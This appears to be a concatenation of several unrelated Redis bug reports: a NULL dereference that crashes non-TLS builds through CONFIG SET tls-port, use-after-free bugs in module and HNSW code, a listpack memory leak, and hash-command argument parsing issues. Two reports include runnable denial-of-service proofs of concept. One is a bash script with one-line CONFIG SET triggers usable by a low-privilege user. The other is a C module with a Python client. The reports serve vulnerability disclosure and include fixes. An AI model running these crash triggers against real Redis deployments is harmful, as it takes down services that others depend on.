body:
Describe the bug
When Redis is built without OpenSSL/TLS, tls-port, tls-replication, and tls-cluster remain runtime-modifiable via CONFIG SET. Their config apply callbacks call connTypeConfigure(connectionTypeTls(), ...), but in a non-TLS build connectionTypeTls() returns NULL and connTypeConfigure() dereferences it unconditionally — a NULL pointer dereference that takes down the whole redis-server process with SIGSEGV.
The sink (src/connection.h:435, inline):
static inline int connTypeConfigure(ConnectionType *ct, void *priv, int reconfigure) {
    return ct->configure(priv, reconfigure);   /* ct == NULL -> SIGSEGV */
}
The two callers that reach it (src/config.c):
/* src/config.c:2756 — applyTlsCfg (used by tls-replication / tls-cluster / cert paths) */
static int applyTlsCfg(const char **err) {
    UNUSED(err);
    if ((server.tls_port || server.tls_replication || server.tls_cluster)
         && connTypeConfigure(connectionTypeTls(), &server.tls_ctx_config, 1) == C_ERR) {
        *err = "Unable to update TLS configuration. Check server logs.";
        return 0;
    }
    return 1;
}

/* src/config.c:2767 — applyTLSPort (used by tls-port) */
static int applyTLSPort(const char **err) {
    if (connTypeConfigure(connectionTypeTls(), &server.tls_ctx_config, 0) == C_ERR) {
        *err = "Unable to update TLS configuration. Check server logs.";
        return 0;
    }
    connListener *listener = listenerByType(CONN_TYPE_TLS);
    ...
}
Why connectionTypeTls() returns NULL in a non-TLS build (src/connection.c:109-117):
ConnectionType *connectionTypeTls(void) {
    static ConnectionType *ct_tls = NULL;
    static int cached = 0;
    if (!cached) {
        cached = 1;
        ct_tls = connectionByType(CONN_TYPE_TLS);   /* not registered when built w/o TLS -> NULL */
    }
    return ct_tls;
}
When TLS is not compiled in, RedisRegisterConnectionTypeTLS() does nothing but log and returns C_ERR (src/tls.c:1254-1257), so CONN_TYPE_TLS is never registered and connectionByType() returns NULL. The apply callbacks never check that result, so enabling TLS at runtime dereferences NULL.
Permission boundary (verified). The crash does not require admin/SHUTDOWN privileges. An ACL user granted only +config|set can trigger it. With no-auth or a config-management exposure, any reachable client can crash the process.
Build condition (verified). The current repo build is non-TLS: src/.make-settings has BUILD_TLS=no, and the binary links no OpenSSL library. The bug affects exactly those deployment artifacts; a TLS-enabled build registers the connection type and is unaffected.
To reproduce
The PoC below is self-contained and copy/paste-runnable from the repository root. It launches a non-TLS redis-server with an ACL file defining a user crasher permitted only +config|set, confirms that user is denied PING and CONFIG GET (proving the limited boundary), then runs CONFIG SET tls-port 6380 as that user and checks whether the process died.

Requires a non-TLS build at src/redis-server (the repo default). Verified on commit d28dd44c4, BUILD_TLS=no, 64-bit Linux/GCC 9.4.

#!/usr/bin/env bash
# CONFIG SET tls-* NULL-deref DoS on non-TLS builds — self-contained, copy/paste runnable.
set -u
PORT=18055
WORK="$(mktemp -d)"; ERR="$WORK/server.err"; ACL="$WORK/users.acl"
SERVER="${REDIS_SERVER:-$(command -v redis-server || echo "${PWD}/src/redis-server")}"
CLI="${REDIS_CLI:-$(command -v redis-cli || echo "${PWD}/src/redis-cli")}"

# Wrap every redis-cli call with GNU timeout 8 as a hard backstop, so an occasional
# redis-cli hang can never leave an orphan or block the script. (This build's redis-cli
# does not accept a --timeout flag, so rely on GNU timeout instead.)
rcli() { timeout 8 "$CLI" "$@"; }

# Kill any stale redis-server left on PORT from a prior run, so a port conflict can't
# make a later `wait`/poll block forever.
pkill -9 -f "redis-server.*--port $PORT" 2>/dev/null; sleep 0.2

cleanup() {
  [ -n "${SRV:-}" ] && kill -9 "$SRV" 2>/dev/null
  pkill -9 -f "redis-server.*--port $PORT" 2>/dev/null   # backstop for any interrupt path
  rm -rf "$WORK"
}
trap cleanup EXIT INT TERM

printf 'user default off\nuser crasher on >pw +config|set ~*\n' > "$ACL"

# Refuse to run against a TLS-enabled build (it would not be vulnerable — avoids a false negative).
if ldd "$SERVER" 2>/dev/null | grep -qiE 'libssl|libcrypto'; then
  echo "This binary links OpenSSL (TLS enabled) — not vulnerable. Use a non-TLS build."; exit 0
fi

# Run in the FOREGROUND (not daemonized) so the SIGSEGV crash report is written to stderr ($ERR)
# before the process dies — a daemonized abort can lose buffered log lines and hide the evidence.
"$SERVER" --port "$PORT" --save "" --appendonly no --dir "$WORK" \
          --logfile /dev/stderr --aclfile "$ACL" >"$ERR" 2>&1 &
SRV=$!
# Connection probe: short 2s timeout on the raw cli (connection refused returns
# instantly), max 20 retries (~4s). Do NOT use rcli (8s) here — that would multiply
# 20x and hang the script if the server is slow to come up.
for i in $(seq 1 20); do timeout 2 "$CLI" -p "$PORT" -a pw --user crasher --no-auth-warning PING >/dev/null 2>&1 && break; sleep 0.2; done

# If SRV is already gone the port was still in use and the server never came up — bail out
# instead of falling through to a poll that has nothing to wait for.
if ! kill -0 "$SRV" 2>/dev/null; then
  echo "server failed to start (port may still be in use). Log tail:"; tail -5 "$ERR" 2>/dev/null; exit 1
fi

echo "=== build state ==="
grep -o 'BUILD_TLS=[a-z]*' src/.make-settings 2>/dev/null || true
echo -n "openssl linked? "; ldd "$SERVER" 2>/dev/null | grep -qiE 'ssl|crypto' && echo "yes (TLS build)" || echo "no (non-TLS build)"

echo; echo "=== permission boundary: crasher has ONLY +config|set ==="
echo -n "PING           -> "; rcli -p "$PORT" -a pw --user crasher --no-auth-warning PING 2>&1 | head -1
echo -n "CONFIG GET ... -> "; rcli -p "$PORT" -a pw --user crasher --no-auth-warning CONFIG GET tls-port 2>&1 | head -1

echo; echo "=== trigger: CONFIG SET tls-port 6380 (as +config|set-only user) ==="
echo -n "reply: "; rcli -p "$PORT" -a pw --user crasher --no-auth-warning CONFIG SET tls-port 6380 2>&1 | head -1

# Poll whether the server died within 3s. Do NOT use `wait $SRV` — if the server fails to
# crash (port conflict, command not delivered, non-TLS build guard slipped, etc.) `wait`
# blocks forever and the whole script hangs. The bounded poll below always terminates.
dead=0
for i in $(seq 1 30); do kill -0 "$SRV" 2>/dev/null || { dead=1; break; }; sleep 0.1; done
if [ "$dead" = 1 ]; then
  echo "VERDICT: server CRASHED — SIGSEGV DoS reproduced as +config|set-only user."
else
  echo "VERDICT: ALIVE (no crash within 3s — likely not a non-TLS build, or command not delivered)."
fi
echo; echo "=== crash evidence from server log ==="
grep -iE 'Missing implement of connection type tls|crashed by signal|cmd=config|set user=crasher' "$ERR" 2>/dev/null | head -8
Observed output on the non-TLS build (commit d28dd44c4, BUILD_TLS=no):
=== build state ===
BUILD_TLS=no
openssl linked? no (non-TLS build)

=== permission boundary: crasher has ONLY +config|set ===
PING           -> NOPERM User crasher has no permissions to run the 'ping' command
CONFIG GET ... -> NOPERM User crasher has no permissions to run the 'config|get' command

=== trigger: CONFIG SET tls-port 6380 (as +config|set-only user) ===
reply: Error: Server closed the connection

VERDICT: server CRASHED — SIGSEGV DoS reproduced as +config|set-only user.

=== crash evidence from server log ===
... # Missing implement of connection type tls
... # Redis 255.255.255 crashed by signal: 11, si_code: 1
... cmd=config|set user=crasher ...

Process exit status is 139 (SIGSEGV, core dumped). All three claimed triggers were verified to crash individually (each on a fresh server):
  tls-replication yes: CRASHED — crashed by signal: 11
  tls-cluster yes:     CRASHED — crashed by signal: 11
  tls-port 6380:       CRASHED — crashed by signal: 11
  tcp-port 6380:       ALIVE                          (non-TLS control: safe)

Equivalent bare redis-cli commands on a non-TLS server (any one crashes it):
CONFIG SET tls-port 6380          # via applyTLSPort
CONFIG SET tls-replication yes    # via applyTlsCfg
CONFIG SET tls-cluster yes        # via applyTlsCfg

Expected behavior
In a build without TLS support, CONFIG SET of any tls-* enabling directive must return a plain error (e.g. ERR CONFIG SET failed: TLS is not built/enabled) and leave the process running. A non-TLS binary must not crash — the missing connection type is a known, expectable runtime condition (connectionTypeTls() is explicitly documented as possibly NULL), so applying a TLS config must handle it.
Additional information

Sink: src/connection.h:435 (ct->configure(priv, reconfigure) with ct == NULL).
Callers: applyTlsCfg (src/config.c:2756) and applyTLSPort (src/config.c:2767). The source report cited lines 2760/2761/2770; the current tree is 2758/2760/2768 (a ~2-line drift — same locations).
connectionTypeTls(): src/connection.c:109, intentionally NULL-safe. RedisRegisterConnectionTypeTLS() (src/tls.c:1254) no-ops + logs Connection type tls not builtin in non-TLS builds.
Reach: the three tls-* directives are declared MODIFIABLE_CONFIG, so they are writable at runtime even when the feature is absent, which is the precondition for the crash.
Verified: commit d28dd44c4, BUILD_TLS=no, malloc=libc bits=64, GCC 9.4 / 64-bit Linux. ACL user ... +config|set ~* (no +ping, no +config|get, no +@admin) reproduces the crash — confirms the low permission boundary. Exit 139, crashed by signal: 11.
Scope: affects only non-TLS builds. A TLS-enabled build registers the type and connTypeConfigure runs normally. Default Redis builds (BUILD_TLS=no) are vulnerable; users who compile with BUILD_TLS=yes are not.
Suggested fix: in applyTlsCfg/applyTLSPort, check the connectionTypeTls() result and, when TLS is not built/enabled, return a normal CONFIG SET failed ... TLS is not built/enabled error (return 0 with *err) instead of calling connTypeConfigure(NULL, ...). Equivalently, make connTypeConfigure itself NULL-guard. Consider also hiding/mark-as-unavailable the TLS-enabling directives in non-TLS builds so they cannot be set at all.

static int applyTlsCfg(const char **err) {
    UNUSED(err);
    if (server.tls_port || server.tls_replication || server.tls_cluster) {
        ConnectionType *ct = connectionTypeTls();
        if (ct == NULL || connTypeConfigure(ct, &server.tls_ctx_config, 1) == C_ERR) {
            *err = "Unable to update TLS configuration: TLS is not built/enabled. Check server logs.";
            return 0;
        }
    }
    return 1;
}
/* applyTLSPort: same NULL-check on connectionTypeTls() before connTypeConfigure(). */

Describe the bug
The RM_RegisterClusterMessageReceiver() function has a use-after-free bug when unregistering the head node of the clusterReceivers[type] linked list.
In the deletion path, when prev == NULL, the code updates clusterReceivers[type]->next instead of updating the head pointer clusterReceivers[type]. As a result, clusterReceivers[type] still points to the freed node after zfree(r), and later accesses to clusterReceivers[type] may dereference a dangling pointer.
In RM_RegisterClusterMessageReceiver() at src/module.c line ~9513, the code frees the receiver but leaves the list head pointing to freed memory:
  void RM_RegisterClusterMessageReceiver(RedisModuleCtx *ctx, uint8_t type,
  RedisModuleClusterMessageReceiver callback) {
      if (!server.cluster_enabled) return;

      uint64_t module_id = moduleTypeEncodeId(ctx->module->name,0);
      moduleClusterReceiver *r = clusterReceivers[type], *prev = NULL;
      while(r) {
          if (r->module_id == module_id) {
              /* Found! Set or delete. */
              if (callback) {
                  r->callback = callback;
              } else {
                  /* Delete the receiver entry if the user is setting
                   * it to NULL. Just unlink the receiver node from the
                   * linked list. */
                  if (prev)
                      prev->next = r->next;
                  else
                      clusterReceivers[type]->next = r->next;  // <-- BUG: head pointer is not updated
                  zfree(r);  // <-- r is freed here
          }
          prev = r;
          r = r->next;
      }
  }
After this, clusterReceivers[type] still points to the freed r, so any later traversal or access through clusterReceivers[type] can trigger a use-after-free.

PERSIST/KEEPTTL
PERSIST can only be given for HGETEX and KEEPTTL for HSETEX but the code doesn’t verify it in case of error:
127.0.0.1:5555> HSETEX h ex 100 persist fields 1 k v
(error) ERR Only one of EX, PX, EXAT, PXAT or KEEPTTL arguments can be specified

i think it will be more readable if you used this structure:
        } else if (command_type == HASH_CMD_HGETEX && !strcasecmp(c->argv[i]->ptr, "PERSIST")) {
            if (*flags & (HFE_EX | HFE_EXAT | HFE_PX | HFE_PXAT | HFE_PERSIST))
                goto err_expiration;
            *flags |= HFE_PERSIST;
        }

instead of this block:
    /* Validate command-specific argument compatibility */
    if ((command_type == HASH_CMD_HGETEX && (*flags & (HFE_KEEPTTL | HFE_FXX | HFE_FNX))) ||
        (command_type == HASH_CMD_HSETEX && (*flags & HFE_PERSIST))) {
        addReplyError(c, "unknown argument");
        return C_ERR;
    }

that would also solve the problem (error will be “unknown argument” in case of HSETEX + PERSIST)
existence of FIELDS
this is only a potential bug, but worth solving: parseHashFieldExpireArgs doesn’t fail in case the mandatory FIELDS was not given
currently we are guarded by the argc check, but if we had more optional args like EX, FNX etc that weren’t mutually exclusive we could reach this situation
multiple FIELDS
127.0.0.1:5555> HSETEX key FIELDS 1 f1 v1 FIELDS 1 f2 v2
(integer) 1
127.0.0.1:5555> hgetall key
1) "f2"
2) "v2"

Describe the bug
lpBatchInsert() may leak the temporary encoded-entry buffer enc when the function exits through certain early return paths.
To reproduce
Inside lpBatchInsert(), the function conditionally allocates a temporary array of encoded entries (lines 1167–1170):
if (len > sizeof(tmp) / sizeof(struct listpackInsertEntry)) {
    /* If 'len' is larger than the local buffer size, allocate on the heap. */
    enc = zmalloc(len * sizeof(struct listpackInsertEntry));
}
Later in the function, there are early return paths that occur after this allocation.


The first occurs when the computed size of the new listpack exceeds the allowed limit (line 1211):
if (new_listpack_bytes > UINT32_MAX) return NULL;
If enc was allocated on the heap (i.e., enc != tmp), returning directly here causes the allocated buffer to be leaked.


A second early return exists in the reallocation path (lines 1218–1223):
/* Realloc before: we need more room. */
if (new_listpack_bytes > old_listpack_bytes &&
    new_listpack_bytes > lp_malloc_size(lp)) {
    if ((lp = lp_realloc(lp,new_listpack_bytes)) == NULL) return NULL;
    dst = lp + poff;
}
If lp_realloc() fails, the function returns NULL without releasing enc, which again results in a memory leak.


Expected behavior
The temporary buffer enc should be released on all exit paths after it may have been heap-allocated.

Describe the bug
Redis core triggers a heap-use-after-free (UAF) in the Modules API path RedisModule_UnblockClient() (RM_UnblockClient in src/module.c) when a module keeps a RedisModuleBlockedClient * handle and later calls RedisModule_UnblockClient(bc, ...) from a background thread after the client disconnected and the main thread already freed bc.
This manifests as a server crash (DoS) under AddressSanitizer, and is undefined behavior in non-sanitized builds.
Key points:

Affected API: RedisModule_UnblockClient(RedisModuleBlockedClient *bc, void *privdata)
Affected core code: RM_UnblockClient() / moduleUnblockClientByHandle() / moduleHandleBlockedClients()
Trigger condition: module blocks a client (e.g., RedisModule_BlockClientOnKeys), client disconnects, module thread later unblocks using a stale bc.

To reproduce
This report assumes you have:

a Redis source checkout (or your Redis repo) at <REDIS_SRC>

Reproduction uses a real TCP client that sends a module command and then disconnects immediately.

Build Redis with ASan (tested on unstable):

cd <REDIS_SRC>
make -j"$(nproc)" SANITIZER=address

Create a minimal reproducer module (save as repro_module.c next to your Redis checkout, or anywhere convenient):

#include "redismodule.h"
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

/* Dummy timeout callback required by RM_UnblockClient when blocked_on_keys=1. */
static int DummyTimeout(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    REDISMODULE_NOT_USED(argv);
    REDISMODULE_NOT_USED(argc);
    RedisModule_ReplyWithNull(ctx);
    return REDISMODULE_OK;
}

static void *RaceThread(void *arg) {
    RedisModuleBlockedClient *bc = (RedisModuleBlockedClient *)arg;
    fprintf(stderr, "Thread starting for bc %p\n", bc);
    /* Give time for: client disconnect -> main thread cleanup -> bc freed. */
    usleep(200 * 1000); /* 200ms */
    fprintf(stderr, "Thread calling UnblockClient for bc %p\n", bc);
    RedisModule_UnblockClient(bc, NULL); /* UAF: bc may already be freed */
    return NULL;
}

static int RaceCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 2) return RedisModule_WrongArity(ctx);
    RedisModuleString *key = argv[1];

    /* Block the client on keys, obtain bc handle. */
    RedisModuleBlockedClient *bc =
        RedisModule_BlockClientOnKeys(ctx, NULL, DummyTimeout, NULL, 0, &key, 1, NULL);

    pthread_t tid;
    int err = pthread_create(&tid, NULL, RaceThread, bc);
    if (err != 0) {
        char buf[128];
        snprintf(buf, sizeof(buf), "pthread_create failed: %s", strerror(err));
        return RedisModule_ReplyWithError(ctx, buf);
    }
    pthread_detach(tid);
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    REDISMODULE_NOT_USED(argv);
    REDISMODULE_NOT_USED(argc);
    if (RedisModule_Init(ctx, "race", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    if (RedisModule_CreateCommand(ctx, "race.trigger", RaceCommand, "write", 1, 1, 1) ==
        REDISMODULE_ERR)
        return REDISMODULE_ERR;
    return REDISMODULE_OK;
}

Compile the module (ensure it can include <REDIS_SRC>/src/redismodule.h):

gcc -fPIC -shared -o repro_module.so repro_module.c -I "<REDIS_SRC>/src" -lpthread

Start redis-server with ASan build and load the module:

"<REDIS_SRC>/src/redis-server" --daemonize no --protected-mode no --loadmodule "$(pwd)/repro_module.so" 2>redis.log

In a separate terminal, run a minimal raw-socket client that sends the command and disconnects immediately.
Save as repro_client.py:

import socket
import time

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 6379))
    # RESP: race.trigger foo
    s.sendall(b"*2\r\n$12\r\nrace.trigger\r\n$3\r\nfoo\r\n")
    # Short delay to increase likelihood the command has blocked.
    time.sleep(0.00005)
    s.close()

if __name__ == "__main__":
    main()
Run it multiple times (the module spawns a background thread per call):
python3 repro_client.py
python3 repro_client.py
python3 repro_client.py
What the reproducer does (minimal behavior):

Module command race.trigger <key> calls RedisModule_BlockClientOnKeys(...) and gets a RedisModuleBlockedClient *bc.
Module spawns a pthread that sleeps briefly and then calls RedisModule_UnblockClient(bc, NULL).
Client disconnects immediately after sending the command (raw socket close()).
Main thread processes blocked clients and frees bc.
Background thread later dereferences bc inside RM_UnblockClient() → UAF.


Inspect server stderr / redis.log for the ASan report:

grep -n "ERROR: AddressSanitizer: heap-use-after-free\\|SUMMARY: AddressSanitizer" -n redis.log
Expected behavior
Redis should not dereference a freed RedisModuleBlockedClient * even if a module calls RedisModule_UnblockClient() after the client disconnect cleanup path ran.
Possible acceptable outcomes (depending on intended API contract):

Return an error (e.g., REDISMODULE_ERR) when bc is stale/invalid, without crashing.
Make stale handles fail safely (e.g., generation/validity check), rather than use-after-free.

Additional information

Tested Redis:

Branch: unstable
Commit: 16068d6b6312bdd6c191afbed703b2296df4909b
Build: SANITIZER=address


Repro artifacts:

Provided inline in this report as repro_module.c and repro_client.py (copy/paste).



ASan evidence (single report includes alloc/free/use chain):

Use: RM_UnblockClient (src/module.c:8507) from module thread
Free: moduleHandleBlockedClients (src/module.c:8649) in main thread
Alloc: moduleBlockClient (src/module.c:8033) in main thread

Note on triggerability / threat model:

Loading a module is typically an admin action, but once such a module is loaded, an unprivileged client can trigger the crash by executing the module command and disconnecting immediately.
Non-ASan builds may not crash reliably (still UB); ASan makes the bug deterministic and provides proof.

Describe the bug
The hnsw_cursor_free() function has a use-after-free bug where it accesses cursor->index after the cursor has been freed with hfree(cursor).
In hnsw_cursor_free() at line ~2584, the code frees the cursor and then tries to access it:
void hnsw_cursor_free(hnswCursor *cursor) {
    if (pthread_rwlock_wrlock(&cursor->index->global_lock) != 0) {
        return;
    }

    hnswCursor *x = cursor->index->cursors;
    hnswCursor *prev = NULL;
    while(x) {
        if (x == cursor) {
            if (prev)
                prev->next = cursor->next;
            else
                cursor->index->cursors = cursor->next;
            hfree(cursor);  // <-- cursor is freed here
            break;
        }
        prev = x;
        x = x->next;
    }
    pthread_rwlock_unlock(&cursor->index->global_lock);  // <-- BUG: accessing freed memory
}
